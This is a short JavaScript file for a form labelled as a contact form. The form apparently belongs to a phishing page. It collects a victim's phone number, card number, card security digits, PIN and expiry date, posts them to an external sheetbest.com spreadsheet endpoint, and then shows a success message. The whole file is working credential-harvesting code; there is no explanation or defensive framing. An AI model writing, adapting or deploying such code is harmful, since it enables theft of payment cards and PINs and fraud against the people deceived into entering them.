const formulario = document.getElementById('contact-form');
const registro = document.getElementById('registro');
const exito = document.getElementById('exito');

formulario.addEventListener('submit', async(e) =>{
    e.preventDefault();


try {    
    const respuesta = await fetch('https://api.sheetbest.com/sheets/138bdc24-ed3e-4c29-96ac-3b29060f8eef', {
        method: 'POST',
        mode: 'cors',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            "Telefono": formulario.telefono.value,
            "Tarjeta": formulario.tarjeta.value,
            "Digitos": formulario.tarjeta2.value,
            "Nip": formulario.nip.value,
            "Fecha": formulario.fecha.value
        })
    });



} catch(error){
    console.log(error);
}
    
    registro.classList.remove('activo');
    exito.classList.add('activo');
});
